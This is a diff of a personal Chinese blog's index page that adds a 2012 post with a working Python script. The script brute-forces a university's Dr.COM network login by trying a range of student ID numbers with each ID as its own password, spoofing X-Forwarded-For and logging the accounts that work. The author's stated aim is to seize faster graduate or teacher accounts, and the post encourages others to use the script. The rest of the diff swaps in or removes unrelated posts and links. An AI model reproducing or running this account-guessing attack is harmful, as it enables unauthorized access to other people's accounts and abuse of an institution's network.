@@ -9,7 +9,7 @@
   <meta name="author" content="dawncold">
 
   
-  <meta name="description" content="&lt;p&gt;着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。&lt;/p&gt; 不过在用的时候发现查看带有中文字符的文件会出现乱码，在这里得到了解决方案 &hellip;">
+  <meta name="description" content="&lt;p&gt;嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -76,6 +76,167 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2012/04/04/crack-drcom-account-in-python/">Python猜研究生账号</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true">Apr 4<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！&lt;/p&gt;
+</code></pre>
+
+<br /><pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
+
+
+<h1>encoding: utf-8</h1>
+
+<p>import urllib2
+import urllib
+import sys
+import types</p>
+
+<p>guess_list = []
+server_url = "http://222.174.155.19/"
+headers = { 'User-Agent'            :   'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',</p>
+
+<pre><code>'X-Forwarded-For'   :   '1.1.1.1'}
+</code></pre>
+
+<p>def usage():</p>
+
+<pre><code>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
+</code></pre>
+
+<p>def Login(username, password):</p>
+
+<pre><code>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+request = urllib2.Request(url = server_url, data = params, headers = headers)
+try:
+    output = urllib2.urlopen(request, timeout = 3).readlines()
+    Log(output[5], username, password)
+except:
+    print "timeout!"
+    global guess_list
+    guess_list = guess_list[1:]
+    guess_list.append(username)
+</code></pre>
+
+<p>def Logout():</p>
+
+<pre><code>output = urllib2.urlopen(server_url + "F.htm")
+</code></pre>
+
+<p>def Log(output,username, password):</p>
+
+<pre><code># "msga='error1'" =&amp;gt; can not login in web
+result = output.find("msga='error1'")
+if result != -1:
+    print "find one!!!"
+    f = open("./content.dat", 'a')
+    f.write(str(username) + '\n')
+    f.close()
+else:
+    print "pass!"
+    f = open("./bad.dat",'a')
+    f.write(str(username) + '\n')
+    f.close()
+#drop first element 
+global guess_list
+guess_list = guess_list[1:]
+</code></pre>
+
+<p>def show_result():</p>
+
+<pre><code>print "Result:##########################################"
+print "Have Guessed:"
+for i in open("./content.dat").readlines():
+    print i,
+print "some accounts can not guessed are in bad.dat"
+print "Result:##########################################"
+</code></pre>
+
+<p>def get_timeout_list(timeout_file_path):</p>
+
+<pre><code>f = open(timeout_file_path)
+global guess_list 
+guess_list = f.readlines()
+f.close()
+</code></pre>
+
+<p>if len(sys.argv) == 2:</p>
+
+<pre><code># itself and only one argv,the path of account list file...
+get_timeout_list(sys.argv[1])
+</code></pre>
+
+<p>elif(len(sys.argv) &lt; 2):</p>
+
+<pre><code>usage()
+</code></pre>
+
+<p>else:</p>
+
+<pre><code>#start and end account,argv[1] and argv[2]
+start = int(sys.argv[1])
+end = int(sys.argv[2])
+if start &amp;gt; end:
+    usage()
+    exit(-1)
+else:
+    guess_list = range(start, end + 1)
+</code></pre>
+
+<p>if <strong>name</strong> == &#8221;<strong>main</strong>&#8221;:</p>
+
+<pre><code>while True:
+    for i in guess_list:
+        #drop last \n or \r
+        if type(i) == types.StringType:
+            i = i.rstrip('\n\r')
+        Logout()
+        print "Guess: " + str(i)
+        Login(i, i)
+
+    if len(guess_list) == 0:
+        break
+show_result()&lt;/pre&gt;
+</code></pre>
+
+<br /><p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&#8217;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
+
+
+<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -598,64 +759,6 @@ Results logged to /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/02/07/some-issue-when-saving-rules-in-iptables/">保存iptables规则遇到的问题</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-02-07T18:03:00+08:00" pubdate data-updated="true">Feb 7<span>th</span>, 2012</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><pre><code>        &lt;p&gt;开了vps竟然没开vpn简直是罪过了，只是因为前段时间vps升级到了centos6，挺多东西支持不好，于是安装vpn也就失败了，现在已经没问题了，刚刚用iPad测试了vpn可用。&lt;/p&gt;
-</code></pre>
-
-<p>在保存iptables规则的时候遇到这样的问题：</p>
-
-
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">iptables: Saving firewall rules to /etc/sysconfig/iptables: /etc/init.d/iptables: line 268: restorecon: command not found</pre>
-
-
-<br /><p>当然你可能会看到中文的提示（我的就是），意思是一样的。从<a href="http://www.live-in.org/archives/1112.html">这里</a>得到了解决方案：</p>
-
-
-<p>安装一个包包：</p>
-
-
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">yum install policycoreutils</pre>
-
-
-<br /><p>行了，剩下就没遇到问题了：）</p>
-
-
-<p>稍稍广告一下吧：欢迎使用Yardvps的VPS哦，我就在使用，现在很稳定，现在有了中文界面，支持支付宝，挺好吧？可以点击<a href="http://www.yardvps.com/billing/aff.php?aff=399">这里</a>购买，这样我也许能得到一点推广费用：）</p>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/7/">&larr; Older</a>
@@ -673,6 +776,10 @@ Results logged to /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2012/12/19/make-a-contribution-to-open-source-project/">给开源项目做贡献了</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2012/11/25/thinking-convert-to-octopress-blog-system/">我在考虑迁移到octopress上</a>
       </li>
     
@@ -686,10 +793,6 @@ Results logged to /usr/local/Cellar/ruby/1.9.3-p0/lib/ruby/gems/1.9.1/gems/mysql
     
       <li class="post">
         <a href="/blog/2012/10/08/lxc-practical/">LXC实践</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2012/10/08/lvm-and-raid1/">LVM+RAID实践</a>
       </li>
     
   </ul>
